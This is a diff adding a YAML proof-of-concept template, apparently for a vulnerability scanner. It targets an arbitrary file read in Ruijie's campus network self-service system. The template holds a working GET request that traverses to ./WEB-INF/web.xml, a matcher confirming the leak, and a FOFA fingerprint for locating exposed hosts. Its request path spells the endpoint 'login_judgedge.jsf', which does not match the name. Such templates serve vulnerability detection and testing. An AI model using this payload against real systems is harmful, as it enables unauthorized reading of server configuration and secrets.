@@ -1,0 +1,22 @@
+id: poc-yaml-ruijie-campus-network-self-service-system-login-judge-jsf-anyfile-read
+info:
+  name: 锐捷 校园网自助服务系统 login_judge.jsf 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 锐捷 校园网自助服务系统
+  fofa: 校园网自助服务系统
+requests:
+- method: GET
+  path: /selfservice/selfservice/module/scgroup/web/login_judgedge.jsf?view=./WEB-INF/web.xml%3F
+  expression: 'status_code == 200
+
+    && contains(body,"WEB-INF\\config\\property\\system.properties")
+
+    && contains(body,"<param-name>")
+
+    && !contains(body,"access Forbidden!")
+
+    '
+variables: {}
+transport: http
